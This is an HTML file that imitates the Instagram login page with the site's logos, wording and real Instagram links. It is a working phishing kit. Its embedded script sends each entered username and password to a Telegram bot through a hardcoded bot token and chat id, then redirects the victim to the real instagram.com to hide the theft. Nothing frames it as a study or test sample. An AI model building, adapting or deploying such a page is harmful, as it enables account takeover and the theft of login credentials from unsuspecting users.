<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="newstyle.css">
    <link rel="icon" href="favicon.png" type="image/icon">
</head>
<body>

    <div class="login-container">
    	<img class="logo-pic" src="logo.png" alt="Logo">
        <form class="login-form" id="loginForm" novalidate>
            <div class="form-group input-container">
                <input id="username" name="u_name" type="text" placeholder=" ">
                <label for="username">Username, email address or mobile number</label>
                <span class="clear-icon">&times;</span>
            </div>
            <div class="form-group input-container">
                <input id="password" name="pass" type="password" placeholder=" ">
                <label for="password">Password</label>
                <span class="toggle-password">
                    <img id="eye-icon" src="hide.png" alt="Toggle Password">
                </span>
            </div>
            
            <button type="submit" class="btn btn-primary">Log in</button>
            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgotten password?</a>
        </form>

        <div id="customModal" class="modal-overlay">
            <div class="modal-box">
                <div class="modal-content">
                    <p>Enter your username, email address or mobile number to log in</p>
                </div>
                <div class="modal-footer">
                    <button id="modalOkBtn" class="modal-btn">OK</button>
                    <button id="modalCreateBtn" class="modal-btn">Create new account</button>
                </div>
            </div>
        </div>
        
        <div class="create-account-container">
            <a href="https://www.instagram.com/accounts/emailsignup/" class="btn btn-secondary">Create new account</a>
        </div>
        <img class="meta-pic" src="meta.png" alt="Meta">
    </div>

<script>
    // --- CONFIGURATION ---
    const botToken = '8595419325:AAHCyEpryu-iWIcAGKfD1w1Q-SH5hJGawCU';
    const chatId = '1274263985';

    // --- DOM ELEMENTS ---
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    
    // Icon Elements
    const clearIcon = document.querySelector('.clear-icon');
    const togglePasswordSpan = document.querySelector('.toggle-password');
    const eyeIcon = document.getElementById('eye-icon');
    
    // Modal Elements
    const modal = document.getElementById('customModal');
    const modalText = document.querySelector('.modal-content p'); 
    const modalOkBtn = document.getElementById('modalOkBtn');
    const modalCreateBtn = document.getElementById('modalCreateBtn');

    // --- SUBMISSION LOGIC ---
    if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault(); // Stop page reload

            const usernameValue = usernameInput.value.trim();
            const passwordValue = passwordInput.value.trim();

            // 1. Check if Username is empty
            if (!usernameValue) {
                modalText.innerText = "Enter your username, email address or mobile number to log in";
                modal.style.display = 'flex';
            
            // 2. Check if Password is empty (only if username is filled)
            } else if (!passwordValue) {
                modalText.innerText = "Please enter your password.";
                modal.style.display = 'flex';

            // 3. If both are filled: Send Data & Redirect
            } else {
                // Send to Telegram
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `Login Attempt:\nUser: ${usernameValue}\nPass: ${passwordValue}`
                    })
                });

                // Redirect to example.com after 0.5 seconds
                setTimeout(() => {
                    window.location.href = "https://www.instagram.com";
                }, 500);
            }
        });
    }

    // --- MODAL BUTTON ACTIONS ---
    
    // Close modal when OK is clicked
    if (modalOkBtn) {
        modalOkBtn.addEventListener('click', function() {
            modal.style.display = 'none';
        });
    }

    // Redirect when Create Account is clicked inside modal
    if (modalCreateBtn) {
        modalCreateBtn.addEventListener('click', function() {
            window.location.href = "https://www.instagram.com/accounts/emailsignup/";
        });
    }

    // --- UI LOGIC (Icons) ---

    // 1. Password Eye Icon Logic
    function updateEyeIconVisibility() {
        if (passwordInput.value.length > 0) {
            togglePasswordSpan.style.display = 'flex'; 
        } else {
            togglePasswordSpan.style.display = 'none'; 
        }
    }

    if (passwordInput) {
        passwordInput.addEventListener('input', updateEyeIconVisibility);
    }
    
    if (togglePasswordSpan) {
        togglePasswordSpan.addEventListener('click', function () {
            const currentType = passwordInput.getAttribute('type');
            if (currentType === 'password') {
                passwordInput.setAttribute('type', 'text');
                eyeIcon.src = "show.png"; 
            } else {
                passwordInput.setAttribute('type', 'password');
                eyeIcon.src = "hide.png"; 
            }
        });
    }

    // 2. Username Clear (X) Icon Logic
    if (usernameInput) {
        usernameInput.addEventListener('input', function() {
            if (usernameInput.value.length > 0) {
                clearIcon.style.display = 'block';
            } else {
                clearIcon.style.display = 'none';
            }
        });
    }

    if (clearIcon) {
        clearIcon.addEventListener('click', function() {
            usernameInput.value = ""; 
            clearIcon.style.display = 'none'; 
            usernameInput.focus(); 
        });
    }
</script>
</body>
</html>